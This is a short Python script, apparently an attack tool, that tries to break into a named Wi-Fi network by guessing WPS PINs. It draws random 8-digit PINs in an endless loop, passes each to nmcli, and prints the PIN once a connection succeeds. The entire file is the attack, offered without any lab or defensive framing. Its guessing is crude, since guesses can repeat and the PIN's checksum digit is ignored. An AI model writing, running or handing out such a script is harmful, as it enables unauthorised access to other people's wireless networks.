import random
import subprocess
import time

def generate():
    pin = random.randint(10000000, 99999999)
    return str(pin)

def connect(ssid, pin):
  
    try:
      
        result = subprocess.run(
            ["nmcli", "dev", "wifi", "connect", ssid, "--wps-pin", pin],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )

        if "successfully activated" in result.stdout.lower():
            print(f"Connected '{ssid}'  pin {pin}")
            return True
        else:
            return False
    except Exception as e:
        print(f"Error {pin}: {e}")
        return False

def brute_force_wps(ssid):
    while True:
        pin = generate()
        if connect(ssid, pin):
            print(f"PIN: {pin}")
            break

        time.sleep(1)


network_ssid = input("SSID: ")
brute_force_wps(network_ssid)
 
